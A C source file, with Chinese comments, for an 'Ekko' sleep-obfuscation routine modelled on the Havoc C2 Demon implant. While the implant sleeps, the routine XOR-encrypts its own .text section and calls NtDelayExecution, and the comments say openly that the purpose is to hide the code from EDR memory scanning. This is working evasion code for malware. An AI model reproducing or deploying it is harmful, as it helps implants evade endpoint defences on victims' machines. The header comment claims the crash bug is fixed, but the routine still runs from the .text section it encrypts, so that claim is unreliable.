/*
 * Ekko Sleep Obfuscation
 * 参考 Havoc Demon/src/core/Obf.c 的 Ekko 实现。
 *
 * 原理：
 * 1. 加密 .text section（睡眠期间对内存扫描隐藏代码）
 * 2. Sleep（此时 .text 为密文，EDR 扫描看不到明文）
 * 3. 解密 .text
 *
 * 优势：
 * - 睡眠期间 EDR 扫描内存只能看到密文
 * - 使用 Native API（NtDelayExecution），减少 EDR hook 面
 *
 * BUG-24 (P0-5) fix: 原实现使用 RtlCreateTimerQueue + 回调，
 * 但回调本身在 .text 中，加密自身代码后调用 Sleep() 会崩溃。
 * 修复：去掉回调机制，直接在函数内执行 加密→睡眠→解密。
 */

#include <windows.h>
#include <stdint.h>
#include "../crt/pe.h"

// NtDelayExecution 函数指针
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

// 获取 NtDelayExecution 地址
static NtDelayExecution_t get_nt_delay_exec(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    return (NtDelayExecution_t)GetProcAddress(ntdll, "NtDelayExecution");
}

// XOR 加密/解密（对称操作）
static void xor_encrypt(unsigned char* data, size_t len, unsigned char* key, int keyLen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Ekko 睡眠混淆 — 直接执行 加密→睡眠→解密
int ekko_sleep(PVOID textBase, SIZE_T textSize, unsigned char* key, int keyLen, DWORD sleepMs) {
    NtDelayExecution_t pNtDelay = get_nt_delay_exec();
    DWORD oldProtect;

    // 1. 加密 .text (先改为 PAGE_READWRITE)
    VirtualProtect((LPVOID)textBase, textSize, PAGE_READWRITE, &oldProtect);
    xor_encrypt((unsigned char*)textBase, textSize, key, keyLen);
    VirtualProtect((LPVOID)textBase, textSize, oldProtect, &oldProtect);

    // 2. 睡眠（使用 NtDelayExecution 如果可用，否则回退到 Sleep）
    if (pNtDelay) {
        LARGE_INTEGER li;
        li.QuadPart = -(LONGLONG)sleepMs * 10000; // negative = relative
        pNtDelay(FALSE, &li);
    } else {
        Sleep(sleepMs);
    }

    // 3. 解密 .text (先改为 PAGE_READWRITE)
    VirtualProtect((LPVOID)textBase, textSize, PAGE_READWRITE, &oldProtect);
    xor_encrypt((unsigned char*)textBase, textSize, key, keyLen);
    VirtualProtect((LPVOID)textBase, textSize, oldProtect, &oldProtect);

    return 0;
}

// 获取 .text section 信息（复用自 sleep_mask）
int ekko_get_text_section(uintptr_t* outBase, size_t* outSize) {
    HMODULE hMod = pe_get_module_base();
    if (!hMod) return -1;

    unsigned char* base = (unsigned char*)hMod;
    unsigned int rva, vsize;
    if (pe_find_section(base, ".text", &rva, &vsize) != 0) return -4;

    *outBase = (uintptr_t)(base + rva);
    *outSize = (size_t)vsize;
    return 0;
}
